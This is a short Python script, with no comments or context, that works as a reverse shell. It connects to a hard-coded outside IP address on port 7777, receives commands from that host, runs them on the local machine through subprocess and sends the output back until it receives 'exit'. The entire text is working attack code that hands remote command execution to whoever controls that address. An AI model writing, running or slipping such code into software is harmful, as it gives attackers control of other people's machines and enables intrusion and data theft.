import socket
import subprocess


s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)


s.connect(('95.165.8.178', 7777))


while True:
    command = s.recv(4096).decode()
    if command.lower() == 'exit':
        break
    output = subprocess.getoutput(command)
    s.send(output.encode())


s.close()
